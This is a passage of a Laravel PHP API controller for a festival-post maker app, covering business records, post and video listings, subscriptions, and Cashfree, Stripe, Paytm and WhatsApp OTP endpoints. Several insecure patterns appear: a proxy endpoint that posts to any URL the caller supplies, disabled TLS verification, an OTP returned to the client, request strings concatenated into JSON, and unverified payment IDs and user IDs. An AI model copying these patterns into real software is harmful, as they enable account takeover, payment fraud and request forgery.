                            \App\Models\BusinessProductMapping::create(['business_id' => $business->id, 'business_product_id' => $pId]);
                        }
                    }
                }
            }

            if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $image = $request->file('bussinessImage');
                    $file = Str::uuid().'.'.$image->getClientOriginalExtension();
            
                    $path = Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                    
                    $user = Business::find($request->get("bussinessId"));
                    $user->logo = $file;
                    $user->save();
                }
            }
            else
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $this->upload_image($request->file("bussinessImage"),"logo", $request->get("bussinessId"));
                }
            }

            $b = Business::find($business->id);
            $category = BusinessCategory::find($b->business_category_id);
            $products = [];
            foreach(\App\Models\BusinessProductMapping::where('business_id', $b->id)->with('product')->get() as $mapping) {
                if ($mapping->product) {
                    $products[] = [
                        'id' => $mapping->product->id,
                        'name' => $mapping->product->name,
                    ];
                }
            }
            
            $pendingProducts = [];
            foreach(\App\Models\BusinessProductRequest::where('business_id', $b->id)->whereIn('status', ['pending', 'approved'])->get() as $req) {
                $pendingProducts[] = [
                    'id' => $req->id,
                    'name' => $req->requested_name,
                    'status' => $req->status,
                    'resolved_product_id' => $req->resolved_product_id
                ];
            }

            $data[] = array(
                "id" => $b->id,
                "name" => $b->name,
                "email" => $b->email,
                "logo" => $this->businessLogoUrl($b->logo),
                "mobileNo" => $b->mobile_no,
                "website" => $b->website,
                "address" => $b->address,
                "businessCategory" => array(
                    "businessCategoryId" => ($category)?$category->id:"",
                    "businessCategoryName" => ($category)?$category->name:"",
                    "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                ),
                "isDefault" => ($b->is_default)?true:false,
                "extra_emails" => $b->extra_emails ?? [],
                "extra_mobile_numbers" => $b->extra_mobile_numbers ?? [],
                "extra_websites" => $b->extra_websites ?? [],
                "extra_addresses" => $b->extra_addresses ?? [],
                "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
                "business_category_id" => $b->business_category_id,
                "business_sub_category_ids" => $b->sub_categories()->pluck('business_sub_category_id')->toArray() ?? [],
                "business_type_id" => $b->business_type_id,
                "business_type_ids" => $b->types()->pluck('business_type_id')->toArray() ?? [],
                "products" => $products,
                "pendingCustomProducts" => $pendingProducts,
            );
            
            return $data;
        }
    }

    public function deleteBusiness(Request $request)
    {
        $authenticatedUser = auth('sanctum')->user();
        if (!$authenticatedUser) {
            return response()->json(['status' => 'Error', 'message' => 'Authentication is required.'], 401);
        }

        $business = Business::whereKey($request->input('bussinessId'))
            ->where('user_id', $authenticatedUser->id)
            ->first();
        if (!$business) {
            return response()->json(['status' => 'Error', 'message' => 'Business not found.'], 404);
        }

        $business->delete();

        return response()->json([
            'status' => "success",
            'message' => "Business Deleted Successfully!",
        ], 200);
    }

    public function setDefaultBusiness(Request $request)
    {
        $authenticatedUser = auth('sanctum')->user();
        if (!$authenticatedUser) {
            return response()->json(['status' => 'Error', 'message' => 'Authentication is required.'], 401);
        }

        $business_data = Business::where('user_id', $authenticatedUser->id)->where('is_default', 1)->get();
        if($business_data->isEmpty())
        {
            $business = Business::whereKey($request->get("bussinessId"))->where('user_id', $authenticatedUser->id)->first();
            if(!empty($business)){
                $business->is_default = 1;
                $business->save();

                return response()->json([
                    'status' => "Success",
                    'message' => "Set Default Business!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Business Id!",
                ], 404);
            }
        }
        else
        {
            $business = Business::whereKey($request->get("bussinessId"))->where('user_id', $authenticatedUser->id)->first();
            if(!empty($business)){
                foreach ($business_data as $value){
                    $b = Business::find($value->id);
                    $b->is_default = 0;
                    $b->save();
                }

                $business = Business::whereKey($request->get("bussinessId"))->where('user_id', $authenticatedUser->id)->first();
                $business->is_default = 1;
                $business->save();

                return response()->json([
                    'status' => "Success",
                    'message' => "Set Default Business!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Business Id!",
                ], 404);
            }
        }
    }

    public function getPost(Request $request) 
    {
        
        if($request->type=="festival")
        {
            $festival = FestivalsPost::where("festivals_id",$request->id)->where('status',1)->get();

            if(!$festival->isEmpty())
            {
                $festival = FestivalsPost::where("festivals_id",$request->id)->where('status',1)->inRandomOrder()->get();
                
                foreach ($festival as $f) 
                {
                    $data[] = array(
                        "postId" => $f->festivals->title."".$f->id,
                        "id" => $f->festivals_id,
                        "type" => "festival",
                        "language" => $f->language->title,
                        "image" => ($f->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                        "is_paid" => ($f->paid==1)?true:false,
                        "height" => $f->height,
                        "width" => $f->width,
                        "image_type" => $f->image_type,
                        "aspect_ratio" => $f->aspect_ratio,
                    );
                }

                return $data;
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            
        }

        if($request->type=="category")
        {
            $category = CategoryPost::where("category_id",$request->id)->where('status',1)->get();
 
            if(!$category->isEmpty())
            {
                $category = CategoryPost::where("category_id",$request->id)->where('status',1)->inRandomOrder()->get();
                
                foreach ($category as $c) 
                {
                   
                    $data[] = array(
                        "postId" => $c->category->name."".$c->id,
                        "id" => $c->category_id,
                        "type" => "category",
                        "language" => $c->language->title,
                        "image" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                        "is_paid" => ($c->paid==1)?true:false,
                        "height" => $c->height,
                        "width" => $c->width,
                        "image_type" => $c->image_type,
                        "aspect_ratio" => $c->aspect_ratio,
                    );
                }

                return $data;
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            
        }
    }

    public function getVideo(Request $request)
    {
        if($request->type=="festival")
        {
            $video = Video::where("type","festival")->where("festival_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->festival->title."".$v->id,
                        "id" => $v->festival_id,
                        "type" => "festival",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }

        if($request->type=="category")
        {
            $video = Video::where("type","category")->where("category_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->category->name."".$v->id,
                        "id" => $v->category_id,
                        "type" => "category",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }

        if($request->type=="business")
        {
            $video = Video::where("type","business")->where("business_category_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->businessCategory->name."".$v->id,
                        "id" => $v->business_category_id,
                        "type" => "business",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }
    }

    public function getAppTranslations()
    {
        $languages = \App\Models\AppTranslation::where('status', 1)->get();
        if ($languages->isEmpty()) {
            return response()->json([
                'status' => "Error",
                'message' => "No Translations Found",
            ], 404);
        }
        $data = [];
        foreach ($languages as $lang) {
            $data[] = [
                'language_code' => $lang->language_code,
                'title' => $lang->title,
                'translations' => $lang->translations ?? [],
            ];
        }
        return response()->json($data);
    }


    public function getLanguage()
    {
        $language = Language::where("status",1)->get();

        if(!$language->isEmpty())
        {
            foreach ($language as $l) 
            {
                $data[] = array(
                    "id" => $l->id,
                    "title" => $l->title,
                    "image" => ($l->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$l->image):asset('uploads/'.$l->image)):""
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;   
    }

    public function getSubscriptionplan()
    {
        $subscription = Subscription::where("status",1)->get();

        if(!$subscription->isEmpty())
        {
            foreach ($subscription as $s) 
            {
                $plan_detail = $s->plan_detail ? @unserialize($s->plan_detail) : [];
                $planDetail = array();
                if($plan_detail != null)
                {
                    foreach($plan_detail as $val)
                    {
                        $planDetail[] = $val;
                    }
                }

                $data[] = array(
                    "id" => $s->id,
                    "planName" => $s->plan_name,
                    "duration" => $s->duration." ".$s->duration_type,
                    "planPrice" => $s->plan_price,
                    "discountPrice" => $s->discount_price,
                    "monthlyPrice" => $s->monthly_price ?? 0,
                    "monthlyDiscountPrice" => $s->monthly_discount_price ?? 0,
                    "yearlyPrice" => $s->yearly_price ?? 0,
                    "yearlyDiscountPrice" => $s->yearly_discount_price ?? 0,
                    "planDetail" => $planDetail,
                    "businessLimit" => $s->business_limit,
                    "googleProductEnable" => $s->google_product_enable,
                    "googleProductId" => $s->google_product_id,
                    "featureLimits" => [
                        "custom_post" => [
                            "base_limit" => $s->custom_post_edit_limit ?? 0,
                            "ad_reward_limit" => $s->custom_post_ad_reward_limit ?? 0,
                        ],
                        "festival_post" => [
                            "base_limit" => $s->festival_post_limit ?? 0,
                            "ad_reward_limit" => $s->festival_post_ad_reward_limit ?? 0,
                        ],
                        "category_post" => [
                            "base_limit" => $s->category_post_limit ?? 0,
                            "ad_reward_limit" => $s->category_ad_reward_limit ?? 0,
                        ],
                        "photoroom_bg" => [
                            "base_limit" => $s->photoroom_bg_limit ?? 0,
                        ],
                    ],
                );
            }
            return $data; 
        }
        else
        {
            return $data = array();
        }
    }

    public function getSubscriptionUpgradePreview(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required|numeric',
            'newPlanId' => 'required|numeric',
        ]);

        if ($validation->fails()) {
            return response()->json([
                'status' => "Error",
                'message' => $validation->errors()->first(),
            ], 404);
        }

        $user = User::find($request->get("userId"));
        if (!$user) {
            return response()->json(['status' => "Error", 'message' => "User not found"], 404);
        }

        $newPlan = Subscription::find($request->get("newPlanId"));
        if (!$newPlan) {
            return response()->json(['status' => "Error", 'message' => "Plan not found"], 404);
        }

        $newPlanPrice = $newPlan->discount_price > 0 ? $newPlan->discount_price : $newPlan->plan_price;
        $creditAmount = 0;
        $remainingDays = 0;

        if ($user->is_subscribe && $user->subscription_end_date && $user->subscription_end_date >= date('Y-m-d')) {
            $latestTransaction = Transaction::where('user_id', $user->id)
                ->where('subscription_id', $user->subscription_id)
                ->orderBy('id', 'desc')
                ->first();

            if ($latestTransaction && $latestTransaction->total_paid > 0) {
                $startDate = \Carbon\Carbon::parse($user->subscription_start_date);
                $endDate = \Carbon\Carbon::parse($user->subscription_end_date);
                $today = \Carbon\Carbon::today();

                $totalDays = $startDate->diffInDays($endDate);
                if ($totalDays <= 0) $totalDays = 1;
                
                $remainingDays = $today->diffInDays($endDate, false); 
                
                if ($remainingDays > 0) {
                    $dailyRate = $latestTransaction->total_paid / $totalDays;
                    $creditAmount = round($dailyRate * $remainingDays);
                }
            }
        }

        if ($creditAmount > $newPlanPrice) {
            $creditAmount = $newPlanPrice;
        }

        $amountToPay = max(0, $newPlanPrice - $creditAmount);

        return response()->json([
            'status' => "success",
            'new_plan_price' => $newPlanPrice,
            'credit_applied' => $creditAmount,
            'amount_to_pay' => $amountToPay,
            'remaining_days' => $remainingDays,
        ], 200);
    }

    public function create_order_cashfree(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
            'customer_id' => 'required',
            'customer_name' => 'required',
            'customer_email' => 'required',
            "customer_phone" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $client = new \GuzzleHttp\Client();

            if(PaymentSetting::getPaymentSetting('cashfree_type') == "Live")
            {
                $url = "https://api.cashfree.com/pg/orders";
            }
            else
            {
                $url = "https://sandbox.cashfree.com/pg/orders";
            }

            $response = $client->request('POST', $url, [
              'body' => '{"customer_details":{"customer_id":"'.$request->get("customer_id").'","customer_name":"'.$request->get("customer_name").'","customer_email":"'.$request->get("customer_email").'","customer_phone":"'.$request->get("customer_phone").'"},"order_amount":'.$request->get("order_amount").',"order_currency":"'.AppSetting::getAppSetting('currency').'"}',
              'headers' => [
                'accept' => 'application/json',
                'content-type' => 'application/json',
                'x-api-version' => '2022-09-01',
                'x-client-id' => PaymentSetting::getPaymentSetting('cashfree_key_id'),
                'x-client-secret' => PaymentSetting::getPaymentSetting('cashfree_key_secret'),
              ],
            ]);
            
            $json = json_decode($response->getBody());

            return response()->json([
                'order_id' => $json->order_id,
                'cf_order_id' => $json->cf_order_id,
                'payment_session_id' => $json->payment_session_id,
            ], 200);
        }
    }

    public function stripePayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            try {
                $stripe = new \Stripe\StripeClient(PaymentSetting::getPaymentSetting('stripe_secret_key'));

                $customer = $stripe->customers->create();

                $ephemeralKey = $stripe->ephemeralKeys->create([
                'customer' => $customer->id,
                ], [
                'stripe_version' => '2022-08-01',
                ]);

                $paymentIntent = $stripe->paymentIntents->create([
                    'amount' => $request->order_amount*100,
                    'currency' => AppSetting::getAppSetting('currency'),
                    'customer' => $customer->id,
                    'automatic_payment_methods' => [
                        'enabled' => 'true',
                    ],
                ]);

                $data = array(
                    'paymentIntent' => $paymentIntent->client_secret,
                    'ephemeralKey' => $ephemeralKey->secret,
                    'customer' => $customer->id,
                    'publishableKey' => PaymentSetting::getPaymentSetting('stripe_publishable_Key')
                );
            } catch (\Stripe\Exception\CardException $e) {
                // Since it's a decline, \Stripe\Exception\CardException will be caught
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\RateLimitException $e) {
                // Too many requests made to the API too quickly
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\InvalidRequestException $e) {
                // Invalid parameters were supplied to Stripe's API
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\AuthenticationException $e) {
                // Authentication with Stripe's API failed
                // (maybe you changed API keys recently)
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiConnectionException $e) {
                // Network communication with Stripe failed
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiErrorException $e) {
                // Display a very generic error to the user, and maybe send
                // yourself an email
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Exception $e) {
                // Something else happened, completely unrelated to Stripe
                $error_msg = $e->getMessage();
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            }
            
            return response()->json($data);

            // $user = User::find($request->user_id);
            // $customer['name'] = $user->name;
            // $customer['description'] = "Festival Post Maker";
            // $customer['address']['line1'] = "Gujarat";
            // $customer['address']['postal_code'] = "360001";
            // $customer['address']['city'] = "Surat";

            // $response = $this->stripeFunction('https://api.stripe.com/v1/customers', 'POST', $customer);
        
            // $r = json_decode($response['body'], true);

            // $customer_data = array(
            //     'customer' => $r['id'], 
            //     'amount' => $request->order_amount*100, 
            //     'currency' => 'USD',
            //     'metadata' => ["order_id" => $request->order_id]
            // );

            // $response1 = $this->stripeFunction('https://api.stripe.com/v1/payment_intents','POST', $customer_data);
            
            // $res = json_decode($response1['body'], true);

            // return $res;

            // if(isset($res['client_secret']))
            // {
            //     $data = array(
            //         'publishable_Key' => PaymentSetting::getPaymentSetting('stripe_publishable_Key'),
            //         'client_secret' => $res['client_secret']
            //     );
            // }
            // else
            // {
            //     $data = [
            //         'status' => 'Error',
            //         'message' => json_encode($res)
            //     ];
            // }
            
            // return response()->json($data);
        }
    }

    public function stripeFunction($url, $method, $val = [])
    {
        $secret_key = PaymentSetting::getPaymentSetting('stripe_secret_key');
        $ch = curl_init();
        $curl_options = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_HEADER => 0,
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/x-www-form-urlencoded',
                'Authorization: Basic ' . base64_encode($secret_key . ':')
            )
        );

        if ($method == 'POST') 
        {
            $curl_options[CURLOPT_POST] = 1;
            $curl_options[CURLOPT_POSTFIELDS] = http_build_query($val);
        } 
        else 
        {
            $curl_options[CURLOPT_CUSTOMREQUEST] = 'GET';
        }
        curl_setopt_array($ch, $curl_options);

        $result = array(
            'body' => curl_exec($ch),
        );
        
        return $result;
    }

    public function paytmPayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
            'order_id' => 'required',
            'user_id' => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $paytmParams = array();

            if(PaymentSetting::getPaymentSetting('paytm_type') == "Live")
            {
                /* for Production */
                $callback_url = "https://securegw.paytm.in/theia/paytmCallback?ORDER_ID=".$request->order_id;
            }
            else
            {
                /* for Staging */
                $callback_url = "https://securegw-stage.paytm.in/theia/paytmCallback?ORDER_ID=".$request->order_id;
            }
            
            $paytmParams["body"] = array(
                "requestType"   => "Payment",
                "mid"           => PaymentSetting::getPaymentSetting('paytm_merchant_id'),
                "websiteName"   => "Hello",
                "orderId"       => $request->order_id,
                "callbackUrl"   => $callback_url,
                "txnAmount"     => array(
                    "value"     => $request->order_amount,
                    "currency"  => "INR",
                ),
                "userInfo"      => array(
                    "custId"    => $request->user_id,
                ),
            );

            $paytm_checksum = PaytmChecksum::generateSignature(json_encode($paytmParams["body"], JSON_UNESCAPED_SLASHES), PaymentSetting::getPaymentSetting('paytm_merchant_key'));

            $paytmParams["head"] = array(
                "signature"    => $paytm_checksum
            );
            
            $post_data = json_encode($paytmParams, JSON_UNESCAPED_SLASHES);
            
            if(PaymentSetting::getPaymentSetting('paytm_type') == "Live")
            {
                /* for Production */
                $url = "https://securegw.paytm.in/theia/api/v1/initiateTransaction?mid=".PaymentSetting::getPaymentSetting('paytm_merchant_id')."&orderId=".$request->order_id;
            }
            else
            {
                /* for Staging */
                $url = "https://securegw-stage.paytm.in/theia/api/v1/initiateTransaction?mid=".PaymentSetting::getPaymentSetting('paytm_merchant_id')."&orderId=".$request->order_id;
            }

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
            curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json")); 

            $response = json_decode(curl_exec($ch),true);

            if($response['body']['resultInfo']['resultStatus'] == "S")
            {
                return response()->json([
                    'status' => 'success',
                    'txnToken' => $response['body']['txnToken'],
                    'callback_url' => $callback_url,
                ]);
            }
            else
            {
                return response()->json([
                    'status' => "error",
                    'message' => $response['body']['resultInfo']['resultMsg'],
                ], 404);
            }

            // $paytm_params["MID"] = PaymentSetting::getPaymentSetting('paytm_merchant_id');
            // $paytm_params["ORDER_ID"] = $request->order_id;
            // $paytm_params["CUST_ID"] = $request->user_id;
            // $paytm_params["TXN_AMOUNT"] = $request->order_amount;
            
            // $paytm_params["INDUSTRY_TYPE_ID"] = "Retail";
            // $paytm_params["CHANNEL_ID"] = "WAP";
            // $paytm_params["WEBSITE"] = "DEFAULT";
            // $paytm_params["CALLBACK_URL"] = "https://securegw.paytm.in/theia/paytmCallback?ORDER_ID=".$paytm_params["ORDER_ID"];
        
            // $paytm_checksum = PaytmChecksum::generateSignature($paytm_params, PaymentSetting::getPaymentSetting('paytm_merchant_id'));
            
            // if(!empty($paytm_checksum)){
            //     return response()->json([
            //         'status' => 'success',
            //         'message' => "Success",
            //         'signature' => $paytm_checksum,
            //         'callback_url' => $paytm_params["CALLBACK_URL"]
            //     ]);
            // }
            // else
            // {
            //     return response()->json([
            //         'status' => "Error",
            //         'message' => "Invalid Access Key"
            //     ], 404);
            // }
        }
    }

    public function verifyPaytmPayment(Request $request)
    {
        $paytm_params["body"] = array(
            "mid" => PaymentSetting::getPaymentSetting('paytm_merchant_id'),
            "orderId" => $request->order_id,
        );
        
        $checksum = PaytmChecksum::generateSignature(json_encode($paytm_params["body"]), PaymentSetting::getPaymentSetting('paytm_merchant_key'));
        
        $paytm_params["head"] = array(
            "signature"    => $checksum
        );
    
        $post_data = json_encode($paytm_params);

        $url = "https://securegw.paytm.in/v3/order/status";
    
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    
        $response = json_decode(curl_exec($ch),true);

        return response()->json([
            'status' => 'success',
            'message' => "Success",
            'response' => $response['body']['resultInfo']['resultStatus']
        ]);
    }

    public function whatsapp_api(Request $request)
    {
        $header = array(
            "clientId" => $request->clientId,
            "clientSecret" => $request->clientSecret,
            "Content-Type" => "application/json",
        );

        $body = '{
            "waId" : "'.$request->waId.'"
        }';

        $client = new \GuzzleHttp\Client([
            'headers' => $header
        ]);
        $response = $client->request('POST', $request->url, [
            'body' => $body
        ]);

        $res = $response->getBody()->getContents();

        return json_decode($res,true);
    }

    public function whatsapp_otp(Request $request)
    {
        $number = $request->number;
        $otp = random_int(100000, 999999);

        $data['apikey'] = WhatsAppSetting::getWhatsAppSetting('api_key');
        $data['instance'] = WhatsAppSetting::getWhatsAppSetting('instance_id');

        $sms = str_replace("[OTP]",$otp,WhatsAppSetting::getWhatsAppSetting('whatsapp_otp_message'));
        
        $data['msg'] = $sms;
        $url = "https://app.wapify.net/api/text-message.php";
        
        $data['number'] = $number;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $result = curl_exec($ch);
        curl_close($ch);
        
        $result = str_replace("<br>","",$result);
        $result = json_decode($result,true);

        if($result['error'] == false)
        {
            $msg['status'] = 200;
            $msg['message'] = "Success";
            $msg['otp'] = $otp;
        }
        else
        {
            $msg['status'] = $result['status'];
            $msg['message'] = $result['message'];
            $msg['otp'] = "";
        }
        
        return response()->json($msg);
    }

    public function addPayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required|numeric',
            'planId' => 'required|numeric',
            'paymentId' => 'required',
            'paymentType' => 'required',
            "paymentAmount" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $user = User::find($request->get("userId"));

                // Security: IDOR protection
                if (auth('sanctum')->check() && auth('sanctum')->id() != $request->get('userId')) {
                    \Log::warning('IDOR attempt on addPayment', [
                        'auth_user' => auth('sanctum')->id(),
                        'target_user' => $request->get('userId'),
                        'ip' => $request->ip(),
                    ]);
                    return response()->json(['status' => 'Error', 'message' => 'Unauthorized'], 403);
                }

            if(!empty($user))
            {
                $subscription = Subscription::find($request->get("planId"));
                if(!empty($subscription))
                {
                    // Security fix: Verify payment amount matches plan price
                    $expectedAmount = $subscription->discount_price > 0 
                        ? $subscription->discount_price 
                        : $subscription->plan_price;
                    
                    $clientAmount = floatval($request->get("paymentAmount"));
                    
                    $partner_id = null;
                    $coupon_code_id = null;
                    $partner_commission_amount = 0;
                    $partner_commission_status = 'pending';

                    if($request->get("code") != "")
                    {
                        $couponCode = \App\Models\CouponCode::where('code', $request->get("code"))->first();
                        if ($couponCode) {
                            $coupon_code_id = $couponCode->id;
                            
                            // Apply coupon discount to expected amount before validation
                            $discountAmount = ($expectedAmount * $couponCode->discount) / 100;
                            $expectedAmount = max(0, $expectedAmount - $discountAmount);

                            if ($couponCode->partner_id) {
                                $partner = User::find($couponCode->partner_id);
                                if ($partner && $partner->is_partner) {
                                    $partner_id = $partner->id;
                                    $percent = $partner->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20;
                                    $partner_commission_amount = ($request->get("paymentAmount") * $percent) / 100;
                                }
                            }
                        }
                    }
                    
                    // Allow small rounding tolerance (1 unit of currency)
                    if ($expectedAmount > 0 && abs($clientAmount - $expectedAmount) > 1) {
                        \Log::warning('Payment amount mismatch', [
                            'userId' => $request->get('userId'),
                            'planId' => $request->get('planId'),
                            'clientAmount' => $clientAmount,
                            'expectedAmount' => $expectedAmount,
                        ]);
                        return response()->json([
                            'status' => 'Error',
                            'message' => 'Payment amount does not match plan price',
                        ], 400);
                    }

                    $id = Transaction::create([
                        "user_id" => $request->get("userId"),
                        "subscription_id" => $request->get("planId"),
                        "total_paid" => $expectedAmount > 0 ? $expectedAmount : $request->get("paymentAmount"),
                        "payment_id" => $request->get("paymentId"),
                        "payment_type" => $request->get("paymentType"),
                        "date" => date('Y-m-d'),
                        "coupon_code_id" => $coupon_code_id,
                        "partner_id" => $partner_id,
                        "partner_commission_amount" => $partner_commission_amount,
                        "partner_commission_status" => $partner_commission_status
                    ])->id;
                    $subscription = Subscription::find($request->get("planId"));

                    $user = User::find($request->get("userId"));
                    $user->subscription_id = $request->get("planId");
                    $user->subscription_start_date = date('Y-m-d');
                    $user->subscription_end_date = ($request->get("planType") == "Monthly")
                        ? date('Y-m-d', strtotime('+1 month'))
                        : date('Y-m-d', strtotime('+1 year'));
                    $user->is_subscribe = 1;
                    $user->business_limit = $subscription->business_limit;
                    $user->save();

                    $rr = ReferralRegister::where("user_id",$request->get("userId"))->where("referral_code",$request->get('referralCode'))->where("subscription",0)->first();
                    if($rr && $request->get('referralCode'))
                    {
                        $refer = ReferralRegister::where("user_id",$request->get("userId"))->where("referral_code",$request->get('referralCode'))->where("subscription",0)->first();
                        $refer->subscription = 1;
                        $refer->save();

                        $referral_user = User::where('referral_code',$request->get('referralCode'))->first();
                        $referral_user->current_balance = $referral_user->current_balance + ReferralSystem::getReferralSystem('subscription_point');
                        $referral_user->total_balance = $referral_user->total_balance + ReferralSystem::getReferralSystem('subscription_point');
                        $referral_user->save();

                        EarningHistory::create([
                            "user_id" => $referral_user->id,
                            "amount" => ReferralSystem::getReferralSystem('subscription_point'),
                            "amount_type" => 1,
                            "refer_user" => $request->get("userId"),
                        ]);
                    }

                    if($request->get("code") != "")
                    {
                        CouponCodeStore::create([
                            "user_id" => $request->get("userId"),
                            "code" => $request->get("code"),
                        ]);
                    }
                    
                    return response()->json([
                        'status' => "success",
                        'message' => "Transaction Success!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Invalid Subscription Plan Id",
                    ], 200);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 200);
            }
        }   
    }

    public function offlinePayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required|numeric',
            'planId' => 'required|numeric',
            "paymentAmount" => 'required',
            'payment_receipt' => "required|mimes:jpg,png,jpeg",
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $user = User::find($request->get("userId"));
            if(!empty($user))
            {
                $subscription = Subscription::find($request->get("planId"));
                if(!empty($subscription))
                {
